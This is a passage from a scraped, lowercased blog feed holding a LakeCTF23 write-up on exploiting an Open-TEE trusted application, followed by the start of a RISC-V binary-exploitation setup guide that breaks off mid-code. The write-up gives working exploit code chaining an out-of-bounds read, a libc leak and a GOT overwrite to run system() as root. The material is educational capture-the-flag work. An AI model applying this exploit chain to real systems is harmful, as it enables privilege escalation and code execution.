0x5e, 0xdf, 0x8c, 0x85, 0x90, 0xe1 } }; int main() { teec_context context; teec_session session; teec_operation operation; teec_sharedmemory in_mem; teec_sharedmemory out_mem; teec_result tee_rv; memset((void *)\u0026amp;in_mem, 0, sizeof(in_mem)); memset((void *)\u0026amp;operation, 0, sizeof(operation)); printf(\u0026#34;initializing context: \u0026#34;); tee_rv = teec_initializecontext(null, \u0026amp;context); if (tee_rv != teec_success) { printf(\u0026#34;teec_initializecontext failed: 0x%x\\n\u0026#34;, tee_rv); exit(0); } else { printf(\u0026#34;initialized\\n\u0026#34;); } // connect to the ta printf(\u0026#34;openning session: \u0026#34;); tee_rv = teec_opensession(\u0026amp;context, \u0026amp;session, \u0026amp;uuid, teec_login_public, null, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_opensession failed: 0x%x\\n\u0026#34;, tee_rv); exit(0); } else { printf(\u0026#34;opened\\n\u0026#34;); } // setup memory for the input/output classes struct studentclass* studentclassinst = (struct studentclass*)malloc(sizeof(struct studentclass)); struct signedstudentclass* signedstudentclassinst = (struct signedstudentclass*)malloc(sizeof(struct signedstudentclass)); memset(studentclassinst, 0, sizeof(struct studentclass)); memset(signedstudentclassinst, 0, sizeof(struct signedstudentclass)); studentclassinst-\u0026gt;students[0].grade = 6; memset(studentclassinst-\u0026gt;students[0].firstname, \u0026#39;a\u0026#39;, name_len-1); memset(studentclassinst-\u0026gt;students[0].lastname, \u0026#39;b\u0026#39;, name_len-1); in_mem.buffer = (void*)studentclassinst; in_mem.size = sizeof(struct studentclass); in_mem.flags = teec_mem_input; // register shared memory, allows us to read data from tee or read data from it tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;in_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to register studentclass shared memory\\n\u0026#34;); exit(0); } printf(\u0026#34;registered shared memory for student class\\n\u0026#34;); out_mem.buffer = (void*)signedstudentclassinst; out_mem.size = sizeof(struct signedstudentclass); out_mem.flags = teec_mem_output; tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;out_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to register signed studentclass memory\\n\u0026#34;); exit(0); } /* @todo: implement actual logic to sign student grades. */ } the missing part here is how to compile it. we make a simple makefile for it:\nopen_tee_path=/opt/opentee cflags += -g -wall -i/home/ctf/opentee/libtee/include -i./ ldadd += -l$(open_tee_path)/lib/ -ltee .phony: all all: grade_ca grade_ca: grade_ca.c grade_ca.h $(cc) $(cflags) -o $@ $^ $(ldadd) .phony: clean clean: rm -f *.o grade_ca 5.2 debugging let\u0026rsquo;s close the environment setup chapter by talking about debugging.\nif we want to debug our client application, the process is the same as with any other c program that we write. the ca does not differ to any regular application as it is running in the ree. if we want to debug the ta, we attach to the docker container with the root user (docker exec -it -u root trustmee_1 /bin/bash). there are two ways to debug tas:\n5.2.1 debugging from the very beginning in this method we want to attach to the ta from the very beginning, including being able to debug the ta_createentrypoint, i.e. instance creation. to do so, we will attach gdb to the open-tee framework. new ta instances are spawned as new processes and run in an endless loop awaiting for tasks (i.e. commands). here is how it is done internally in open-tee:\nint lib_main_loop(struct core_control *ctl_params) { //... new_proc_pid = clone(ta_process_loop, child_stack + child_stack_size, sigchld | clone_parent, \u0026amp;ta_loop_args); //... } int ta_process_loop(void *arg) { //... load_ta(path, \u0026amp;interface); //will perform dlopen() and bring the ta into memory //... pthread_attr_setdetachstate(\u0026amp;attr, pthread_create_detached); pthread_create(\u0026amp;ta_logic_thread, \u0026amp;attr, ta_internal_thread, open_msg); } void *ta_internal_thread(void *arg) { //... for (;;) { //wait for tasks //execute tasks (e.g. open a session, invoke command, etc.) //repeat } //... } so, we will spawn gdb with the command gdb /opt/opentee/bin/opentee-engine `pgrep -f tee_launcher` . next, we will use the following gdb commands:\nset follow-fork-mode child b ta_internal_thread command b ta_createentrypoint end continue afterwards, using our client application, we can load the ta and debug it from the very beginning.\n5.2.2 attaching a debugger to a ta instance in this case, a ta instance already exists and we want to attach to it. the ta is shown when we run ps aux as a process named grade_ta.so. we simply attach to it via gdb and debugging is possible immediately: gdb /opt/opentee/bin/opentee-engine `pgrep -f grade_ta.so` 6. identifying an exploitation strategy on the machine running this challenge we have userspace access. the flag is located at /opt/opentee/flag.txt and belongs to the root user with all permissions removed:\nctf@42ac3fd4b5ef:/home/ctf/solution$ ls -l /opt/opentee/flag.txt ---------- 1 root root 44 dec 28 21:17 /opt/opentee/flag.txt ctf@42ac3fd4b5ef:/home/ctf/solution$ cat /opt/opentee/flag.txt cat: /opt/opentee/flag.txt: permission denied as we run as the ctf user, we cannot access the flag. our goal will be to exploit the ta and do a chmod 777 /opt/opentee/flag.txt so that later we can dump the flag with cat /opt/opentee/flag.txt. it is worth noting that the ta does not produce any output logs and its stdin/stderr/stdout are redirected to /dev/null:\n7. writing the exploit here is a reminder of the bugs that are in-place:\nthe first major bug is that no ta command checks the type of arguments and their direction. this is really bad as type confusion is possible in all commands. in sign_class, the size is not checked correctly. the line end = cursignedstudent + nr_students means that the given memory reference is always assumed to contain nr_students*sizeof(struct student) bytes. in sign_class_student, there is no bounds checking on the index. this leads to an arbitrary read. 7.1 libc.so leak we will start with 3. — the arbitrary read:\n/* sign_class_student */ studentarray = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; idx = params[2].value.a; if (tee_checkmemoryaccessrights(5,studentarray,params[0].memref.size) == tee_success) { if (tee_checkmemoryaccessrights(5,cursignedstudent, params[1].memref.size) == tee_success) { student1 = studentarray + (int)idx; tee_memmove(cursignedstudent,student1,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,student1-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = student1-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student1-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); } } as you can see, we can use any idx and make student1 point anywhere in memory. the buffer cursignedstudent is a shared memory block that we supply with type teec_mem_output. so, with a single sign_class_student command we can leak 0x28 bytes (excluding the random signature). we will use this primitive to find the base address of libc. to do so, we will initially use idx=0 and insert a breakpoint at tee_memmove(cursignedstudent,student1,0x10):\n$rsi=0x7fc3132b2000 is the address of our shared memory block and belongs to the /dev/shm/5203tttttttttt972022484tttttt1704030777tttt vma. a little further below is the rw- page of ld.so. we will search that page, as it is the nearset one, for pointers in order to leak libc:\nperfect! we find a libc leak at $rsi+0x3000+0x18, which corresponds to the symbol _dl_catch_exception. with some arithmetic, we find out that this symbol is located at libc offset 0x174820. so, if we leak this pointer (_dl_catch_exception=0x7fc3131c0820) we can find the base address of libc!\nmemset((void *)\u0026amp;operation, 0, sizeof(operation)); operation.paramtypes = teec_param_types( teec_memref_whole, teec_memref_whole, teec_value_input, teec_none ); operation.params[0].memref.parent = \u0026amp;in_mem; operation.params[1].memref.parent = \u0026amp;out_mem; // byte offset 0x3018 translates to : // 0x3018/sizeof(struct student) // =0x3018/0x28 // =307=0x133 offset of a `struct student` array. operation.params[2].value.a = 0x133; printf(\u0026#34;invoking command sign_class_student: \\n\u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, sign_class_student, \u0026amp;operation, null); if (tee_rv != teec_success \u0026amp;\u0026amp; tee_rv != teec_error_security) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); exit(tee_rv); } printf(\u0026#34;res: 0x%x\\n\u0026#34;, tee_rv); dumphex(out_mem.buffer, sizeof(struct signedstudent)); uint64_t libc_leak = *(uint64_t*)((char*)out_mem.buffer+0x20); uint64_t libc_base = libc_leak - 0x174820; uint64_t libc_system = libc_base + 0x50d70; printf(\u0026#34;found libc base: 0x%lx\\n\u0026#34;, libc_base); 7.2 grade_ta.so leak perfect, we have leaked libc! how about the base address of grade_ta.so? we will rely on mmap relativity. when pages are mmaped, the base address of where mmaped pages are allowed to live is the only thing randomized (mmap_base). however, subsequent mmap calls return an address relative to the mmap_base. here is a very simply demonstration of mmap relativity:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #define abs_diff(x,y) ( (x) \u0026gt; (y) ? ( (x)-(y) ) : ( (y)-(x) ) ) int main() { char *addr1 = mmap(null, 4096, prot_read | prot_write, map_private | map_anonymous, -1, 0); char *addr2 = mmap(null, 4096, prot_read | prot_write, map_private | map_anonymous, -1, 0); char *addr3 = mmap(null, 4096, prot_read | prot_write, map_private | map_anonymous, -1, 0); printf(\u0026#34;base mmap addr: 0x%lx\\n\u0026#34;, (uint64_t)addr1); printf(\u0026#34; [*] mmap addr1: 0x%lx\\n\u0026#34;, (uint64_t)addr1); printf(\u0026#34; [*] mmap addr2: 0x%lx\\n\u0026#34;, (uint64_t)addr2); printf(\u0026#34; [*] mmap addr3: 0x%lx\\n\u0026#34;, (uint64_t)addr3); printf(\u0026#34;abs(addr1-addr2) = 0x%lx\\n\u0026#34;, abs_diff(addr1, addr2)); printf(\u0026#34;abs(addr2-addr3) = 0x%lx\\n\u0026#34;, abs_diff(addr2, addr3)); return 0; } as you can see, no matter how many times we run the program, the relative offset between mmaped pages is constant. the base address is always randomized, however subseqeuent mmap calls return an address deterministically relative to the first mmap call.\nwe will take advantage of mmap relativity as the grade_ta.so is actually loaded by an mmap call! the grade_ta.so is not the pie binary itself (/opt/opentee/bin/opentee-engine is the underlying binary in this case). grade_ta.so is loaded with dlopen by the load_ta internal open-tee function. with simple arithmetic, we find out that grade_ta.so is loaded at constant offset 0x228000 from libc.so:\n7.3 write-what-where primitive remember the 1st bug — no check is performed on ta parameter types. this leads to a type confusion vulnerability. what if instead of a memory reference parameter we provide a value paramter when the ta expects a memory reference parameter? here is what happens internally in the open-tee framework with respect to parameters:\n/*! * \\brief copy_tee_operation_to_internal * convert the tee operation into a generic format so that it can be sent to the ta * \\param operation the tee operation format * \\param internal_op the communication protocol format * \\return 0 on success */ static void copy_tee_operation_to_internal(teec_operation *operation, struct com_msg_operation *internal_op) { struct shared_mem_internal *internal_imp; teec_sharedmemory *mem_source; size_t offset; int i; memset(internal_op, 0, sizeof(struct com_msg_operation)); internal_op-\u0026gt;paramtypes = operation-\u0026gt;paramtypes; for_each_param(i) { if (teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_none || teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_value_output) { continue; } else if (teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_value_input || teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_value_inout) { memcpy(\u0026amp;internal_op-\u0026gt;params[i].param.value, \u0026amp;operation-\u0026gt;params[i].value, sizeof(teec_value)); continue; } //... } as expected, the value paramter is copied via a memcpy from the ca to the tee. however, the ta sees a tee_param union structure:\ntypedef union { struct { void* buffer; size_t size; } memref; struct { uint32_t a; uint32_t b; } value; } tee_param; this means that the tee_param.value and tee_param.memref.buffer overlap in memory! under a parameter type confusion bug we can provide a value paramter and the ta will interpret it as a raw 64-bit pointer! the tee_param.memref.size will be zero because of the memset(internal_op, 0, sizeof(struct com_msg_operation)) shown above. with this in mind, we notice that we can control the pointers passed in tee_memmove (e.g. tee_memmove(cursignedstudent,student1,0x10)). the given ta has partial relro and tee_memmove is present in its .got.plt section. with this information we conclude 2 things:\nwe have an arbitrary write since we control both pointers in tee_memove. these pointers have to pass the check tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, ptr, sz). by overwriting the .got.plt section, we can change tee_memmove to point to libc\u0026rsquo;s system. this is useful because can control both the arguments to tee_memmove and their content. we will focus on the sign_student command:\ntvar1 = tee_checkmemoryaccessrights(5,student2,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(5,cursignedstudent,sz); if (tvar1 == tee_success) { tee_memmove(cursignedstudent,student2,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,student2-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = student2-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student2-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); //writes 0x10 bytes at cursignedstudent+0x28 return tvar1; } } using a sign_student command, we will use the 2nd tee_memmove shown above to overwrite the tee_memmove@.got.plt to point to system. this can be achieved by doing a type confusion on params[1]. with a subsequent sign_student command, we will invoke tee_memmove(\u0026quot;chmod ugo+r /opt/opentee/flag.txt\u0026quot;) which will actually resolve to system(\u0026quot;chmod ugo+r /opt/opentee/flag.txt\u0026quot;). afterwards, we will be able to dump the flag. here is the exploit for the type confusion:\nstatic void create_64bit_teec_value(teec_value *dest, uint64_t val) { dest-\u0026gt;a = (val \u0026lt;\u0026lt; 32) \u0026gt;\u0026gt; 32; dest-\u0026gt;b = val \u0026gt;\u0026gt; 32; } int main() { // ... uint64_t libc_base = /* ... */; uint64_t libc_system = libc_base + 0x50d70; printf(\u0026#34;found libc base: 0x%lx\\n\u0026#34;, libc_base); printf(\u0026#34; [*] system: 0x%lx\\n\u0026#34;, libc_system); //grade_ta.so is mmaped via dlopen() uint64_t grade_ta_base = libc_base + 0x228000; uint64_t grade_ta_getrandombyte_got_plt = grade_ta_base + 0x4020; printf(\u0026#34;found grade_ta.so base: 0x%lx\\n\u0026#34;, grade_ta_base); printf(\u0026#34; [*] getrandombyte@.got.plt: 0x%lx\\n\u0026#34;, grade_ta_getrandombyte_got_plt); uint64_t ret_0_gadget = grade_ta_base + 0x1284; // xor eax, eax; ret; /* pwndbg\u0026gt; got -p grade_ta.so filtering by lib/objfile path: grade_ta.so filtering out read-only entries (display them with -r or --show-readonly) state of the got of /opt/opentee/lib/tas/grade_ta.so: got protection: partial relro | found 11 got entries passing the filter [0x7fc313278018] tee_checkmemoryaccessrights -\u0026gt; 0x7fc313028d30 (tee_checkmemoryaccessrights) ◂— endbr64 [0x7fc313278020] getrandombyte -\u0026gt; 0x7fc313275260 (getrandombyte) ◂— endbr64 [0x7fc313278028] __stack_chk_fail@glibc_2.4 -\u0026gt; 0x7fc313182360 (__stack_chk_fail) ◂— endbr64 [0x7fc313278030] printf@glibc_2.2.5 -\u0026gt; 0x7fc3130ac6f0 (printf) ◂— endbr64 [0x7fc313278038] tee_memmove -\u0026gt; 0x7fc313028f10 (tee_memmove) ◂— endbr64 [0x7fc313278040] tee_allocateoperation -\u0026gt; 0x7fc3130320b0 (tee_allocateoperation) ◂— endbr64 [0x7fc313278048] __syslog_chk@glibc_2.4 -\u0026gt; 0x7fc31316a2e0 (__syslog_chk) ◂— endbr64 [0x7fc313278050] tee_digestupdate -\u0026gt; 0x7fc31302c190 (tee_digestupdate) ◂— endbr64 [0x7fc313278058] calculate_signature -\u0026gt; 0x7fc313275300 (calculate_signature) ◂— endbr64 [0x7fc313278060] tee_digestdofinal -\u0026gt; 0x7fc31302c280 (tee_digestdofinal) ◂— endbr64 [0x7fc313278068] rand@glibc_2.2.5 -\u0026gt; 0x7fc313092760 (rand) ◂— endbr64 */ //let\u0026#39;s do the arbitrary write memset((void *)\u0026amp;operation, 0, sizeof(operation)); memset(out_mem.buffer, 0, sizeof(struct signedstudent)); operation.paramtypes = teec_param_types( teec_memref_whole, teec_value_input, //type confusion teec_none, teec_none ); operation.params[0].memref.parent = \u0026amp;in_mem; create_64bit_teec_value(\u0026amp;operation.params[1].value, grade_ta_getrandombyte_got_plt); //destination address char *payload = (char*)in_mem.buffer; *(uint64_t*)(payload+0x00) = ret_0_gadget; // getrandombyte *(uint64_t*)(payload+0x08) = ret_0_gadget; // __stack_chk_fail *(uint64_t*)(payload+0x10) = ret_0_gadget; // printf@glibc *(uint64_t*)(payload+0x18) = libc_system; // tee_memmove *(uint64_t*)(payload+0x20) = ret_0_gadget; // tee_allocateoperation //__syslog_chk@glibc will be trashed by calculate_signature() //tee_digestupdate will be trashed by calculate_signature() printf(\u0026#34;invoking command sign_student (overwriting .got.plt): \\n\u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, sign_student, \u0026amp;operation, null); if (tee_rv != teec_success \u0026amp;\u0026amp; tee_rv != teec_error_security) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); exit(tee_rv); } printf(\u0026#34;res: 0x%x\\n\u0026#34;, tee_rv); //now, let\u0026#39;s trigger system() with our command memset((void *)\u0026amp;operation, 0, sizeof(operation)); operation.paramtypes = teec_param_types( teec_memref_whole, teec_memref_whole, // we control the contents of the buffer teec_none, teec_none ); memset(in_mem.buffer, 0, sizeof(struct student)); strcpy(out_mem.buffer, \u0026#34;chmod ugo+r /opt/opentee/flag.txt\u0026#34;); operation.params[0].memref.parent = \u0026amp;in_mem; operation.params[1].memref.parent = \u0026amp;out_mem; printf(\u0026#34;invoking command sign_student (changing flag permissions): \\n\u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, sign_student, \u0026amp;operation, null); if (tee_rv != teec_success \u0026amp;\u0026amp; tee_rv != teec_error_security) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); exit(tee_rv); } printf(\u0026#34;res: 0x%x\\n\u0026#34;, tee_rv); system(\u0026#34;cat /opt/opentee/flag.txt\u0026#34;); return 0; } and we have the flag! thank you for reading 🏴\nepfl{ju5t_4_h4ppy_l1ttl3_typ3_c0nfu510n_8u9}\n","title":"Pwning a TEE Trusted Application - LakeCTF23"},{"date":"2023-05-05","image":"/post-resources/riscv-pwn/risc-v.png","imageAlt":"","link":"https://chalkiadakis.me/posts/hack-a-sat-23/riscv-pwn/","summary":"Setting up a pwntools environment for RISC-V using QEMU and chaining ROP gadgets.","tags":["ctf","environment setup","hack-a-sat","pwn","RISC-V"],"text":"this post is about creating a pwn environment for risc-v, exploiting risc-v binaries, and doing rop chains on risc-v. we will use as our target binary to pwn, the drop-baby binary from hack-a-sat ctf 2023.\nnikos@ctf-box:~$ file drop-baby drop-baby: elf 32-bit lsb executable, ucb risc-v, version 1 (sysv), statically linked, for gnu/linux 5.4.0, with debug_info, not stripped setting up an environment before we can begin diving into exploitation, we need to set up our risc-v pwning environment.\nwe will use qemu to emulate the binary, binfmt for seamless interaction with the binary, gdb-multiarch to debug it, pwntools to programmatically interact with it and write our exploit script, binutils-riscv64-linux-gnu for generating shellcode (assembler), and ropgadget to find rop gadgets in risc-v binaries. since this is cutting edge stuff, it is always recommended to run on the latest version.\nvanilla environment let\u0026rsquo;s start with the vanilla environment, so qemu, binfmt, binutils, and gdb:\nsudo apt update sudo apt-get install -y \\ binutils-riscv64-linux-gnu binutils-doc \\ binfmt-support \\ qemu qemu-utils \\ qemu-user qemu-user-static \\ qemu-system qemu-system-misc \\ gdb-multiarch sudo apt-get install gcc-riscv64-linux-gnu # optional. for using gcc to produce risc-v 64-bit binaries. pip install --upgrade pwntools ropgadget if everything has been done installed correctly, you should now have entries registered in binfmt about risc-v:\nnikos@ctf-box:~$ update-binfmts --display qemu-riscv32 (enabled): package = qemu-user-static type = magic offset = 0 magic = \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\xf3\\x00 mask = \\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff interpreter = /usr/libexec/qemu-binfmt/riscv32-binfmt-p detector = qemu-riscv64 (enabled): package = qemu-user-static type = magic offset = 0 magic = \\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\xf3\\x00 mask = \\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff interpreter = /usr/libexec/qemu-binfmt/riscv64-binfmt-p detector = and you should also be able to simply run the binary:\nnikos@ctf-box:~$ file drop-baby drop-baby: elf 32-bit lsb executable, ucb risc-v, rvc, double-float abi, version 1 (sysv), statically linked, for gnu/linux 5.4.0, with debug_info, not stripped nikos@ctf-box:~$ ./drop-baby no flag present you should also be able to run the binary under gdb-multiarch:\ngreat!\npwntools environment now, let\u0026rsquo;s make sure that pwntools with gdb also works (by default, in version \u0026lt;4.9.0, they won\u0026rsquo;t). let\u0026rsquo;s make a template pwntools and run it:\n# minimal-template.py # a minimal custom template for binary exploitation that uses pwntools. # run: # python minimal-template.py [debug] [gdb] from pwn import * # set up pwntools for the correct architecture. see `context.binary/arch/bits/endianness` for more context.binary = elfexe = elf(\u0026#39;./drop-baby\u0026#39;) print(context) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.gdb: return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw) else: target = process([elfexe.path] + argv, *a, **kw) return target # specify your gdb script here for debugging. gdb will be launched the gdb argument is given. gdbscript = \u0026#39;\u0026#39;\u0026#39; # init-gef # continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) arguments = [] io = start(arguments) io.interactive() io.close() nikos@ctf-box:~$ python minimal-template.py [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) traceback (most recent call last): file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 785, in arch defaults = self.architectures[arch] keyerror: \u0026#39;em_riscv\u0026#39; during handling of the above exception, another exception occurred: traceback (most recent call last): file \u0026#34;~/minimal-template.py\u0026#34;, line 8, in \u0026lt;module\u0026gt; context.binary = elfexe = elf(\u0026#39;./drop-baby\u0026#39;) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 176, in fset self._tls[name] = validator(self, val) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 872, in binary self.arch = binary.arch file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 176, in fset self._tls[name] = validator(self, val) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 787, in arch raise attributeerror(\u0026#39;attributeerror: arch must be one of %r\u0026#39; % sorted(self.architectures)) attributeerror: attributeerror: arch must be one of [\u0026#39;aarch64\u0026#39;, \u0026#39;alpha\u0026#39;, \u0026#39;amd64\u0026#39;, \u0026#39;arm\u0026#39;, \u0026#39;avr\u0026#39;, \u0026#39;cris\u0026#39;, \u0026#39;i386\u0026#39;, \u0026#39;ia64\u0026#39;, \u0026#39;m68k\u0026#39;, \u0026#39;mips\u0026#39;, \u0026#39;mips64\u0026#39;, \u0026#39;msp430\u0026#39;, \u0026#39;none\u0026#39;, \u0026#39;powerpc\u0026#39;, \u0026#39;powerpc64\u0026#39;, \u0026#39;riscv\u0026#39;, \u0026#39;s390\u0026#39;, \u0026#39;sparc\u0026#39;, \u0026#39;sparc64\u0026#39;, \u0026#39;thumb\u0026#39;, \u0026#39;vax\u0026#39;] hmm interesting. it seems that the pwnlib library knows about 'riscv' architecture but not about 'em_riscv' (upstream issue here). anyway, we know already that our system can run the binary so let\u0026rsquo;s add a small patch to the ~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/elf/elf.py file of the pwnlib library.\ndiff --git a/elf.py b/elf.py index c6e6708..7f89bd8 100644 --- a/elf.py +++ b/elf.py @@ -481,7 +481,8 @@ class elf(elffile): \u0026#39;em_ppc64\u0026#39;: \u0026#39;powerpc64\u0026#39;, \u0026#39;em_sparc32plus\u0026#39;: \u0026#39;sparc\u0026#39;, \u0026#39;em_sparcv9\u0026#39;: \u0026#39;sparc64\u0026#39;, - \u0026#39;em_ia_64\u0026#39;: \u0026#39;ia64\u0026#39; + \u0026#39;em_ia_64\u0026#39;: \u0026#39;ia64\u0026#39;, + \u0026#39;em_riscv\u0026#39;: \u0026#39;riscv\u0026#39; }.get(self[\u0026#39;e_machine\u0026#39;], self[\u0026#39;e_machine\u0026#39;]) @property let\u0026rsquo;s try running it again now:\nnikos@ctf-box:~$ python minimal-template.py [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) contexttype(arch = \u0026#39;riscv\u0026#39;, binary = elf(\u0026#39;~/drop-baby\u0026#39;), bits = 32, endian = \u0026#39;little\u0026#39;, os = \u0026#39;linux\u0026#39;) [+] starting local process \u0026#39;~/drop-baby\u0026#39;: pid 5541 [*] switching to interactive mode no flag present [*] got eof while reading in interactive $ [*] process \u0026#39;~/drop-baby\u0026#39; stopped with exit code 255 (pid 5541) [*] got eof while sending in interactive great! the binary works with pwntools. let\u0026rsquo;s try pwntools+gdb now:\nnikos@ctf-box:~$ python minimal-template.py gdb [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) contexttype(arch = \u0026#39;riscv\u0026#39;, binary = elf(\u0026#39;~/drop-baby\u0026#39;), bits = 32, endian = \u0026#39;little\u0026#39;, os = \u0026#39;linux\u0026#39;) [!] neither \u0026#39;qemu-riscv\u0026#39; nor \u0026#39;qemu-riscv-static\u0026#39; are available [error] argv must be strings or bytes: [none, \u0026#39;--help\u0026#39;] traceback (most recent call last): file \u0026#34;~/minimal-template.py\u0026#34;, line 26, in \u0026lt;module\u0026gt; io = start(arguments) file \u0026#34;~/minimal-template.py\u0026#34;, line 14, in start return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 1578, in setter return function(*a, **kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/gdb.py\u0026#34;, line 539, in debug sysroot = sysroot or qemu.ld_prefix(env=env) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 1578, in setter return function(*a, **kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/qemu.py\u0026#34;, line 162, in ld_prefix with process([path, \u0026#39;--help\u0026#39;], env=env) as io: file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/tubes/process.py\u0026#34;, line 258, in __init__ executable_val, argv_val, env_val = self._validate(cwd, executable, argv, env) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/tubes/process.py\u0026#34;, line 518, in _validate argv, env = normalize_argv_env(argv, env, self, 4) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/util/misc.py\u0026#34;, line 204, in normalize_argv_env log.error(\u0026#34;argv must be strings or bytes: %r\u0026#34; % argv) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/log.py\u0026#34;, line 439, in error raise pwnlibexception(message % args) pwnlib.exception.pwnlibexception: argv must be strings or bytes: [none, \u0026#39;--help\u0026#39;] from the error message neither 'qemu-riscv' nor 'qemu-riscv-static' are available, it seems that pwntools searches for the qemu-riscv and qemu-riscv-static binaries. let\u0026rsquo;s help it by making them point to qemu-riscv32 and qemu-riscv32-static correspondingly.\nnikos@ctf-box:~$ ln -s /usr/bin/qemu-riscv32 qemu-riscv nikos@ctf-box:~$ ln -s /usr/bin/qemu-riscv32-static qemu-riscv-static nikos@ctf-box:~$ export path=\u0026#34;$path:$(pwd)\u0026#34; nikos@ctf-box:~$ ls drop-baby minimal-template.py qemu-riscv qemu-riscv-static flag.txt let\u0026rsquo;s try again now:\nperfect! our rsic-v pwning environment complete and we can start exploiting (finally)!\nsource code i won\u0026rsquo;t bore you with the reversing of the drop-baby binary. the goal is to get the flag and with that let\u0026rsquo;s jump straight into the buggy code:\nint main() { setvbuf(stdout,null,2,0); char *flag = getenv(\u0026#34;flag\u0026#34;); if (flag == null) { puts(\u0026#34;no flag present\u0026#34;); exit(-1); } //crete flag.txt file. //read and write permissions for the owner of the file, and with no permissions for other users. int flag_fd = open(\u0026#34;flag.txt\u0026#34;, o_creat | o_wronly, 384); if (flag_fd \u0026lt; 0) { printf(\u0026#34;errno = %d trying to open flag.txt\\n\u0026#34;, errno); exit(-1); } size_t svar2 = write(flag_fd,flag,strlen(flag)); if (svar2 != strlen(flag)) { puts(\u0026#34;unable to write flag to file\u0026#34;); exit(-1); } close(flag_fd); //!!! bug: environment variable `flag` does not get wiped from memory. so, even if unsetenv //is invoked, the value of the `flag` environment variable is still somewhere on the stack. if (unsetenv(\u0026#34;flag\u0026#34;) == -1) { puts(\u0026#34;unable to clear environment\u0026#34;); exit(-1); } //setup timeout signal based on `timeout` environment variable. ulong timeout; char *timeout_str = getenv(\u0026#34;timeout\u0026#34;); if (timeout_str == null) { timeout = 10; } else { timeout = strtoul(timeout_str,null,10); if (timeout == 0) { timeout = 10; } } signal(0xe,alarm_handler); //puts(\u0026#34;time\\\u0026#39;s up!\u0026#34;); exit(1); alarm(timeout); puts(\u0026#34;\\nbaby\\\u0026#39;s second risc-v stack smash\\n\u0026#34;); puts(\u0026#34;no free pointers this time and pwning might be more difficult!\u0026#34;); puts(\u0026#34;exploit me!\u0026#34;); do { if (syncronize() == -1) //`synchronize()` expects the following input: `\\xde\\xad\\xbe\\xef` return -1; int res = read_message(); } while (res != -1); return -1; } int read_message(void) { char control_chr; ssize_t nread = 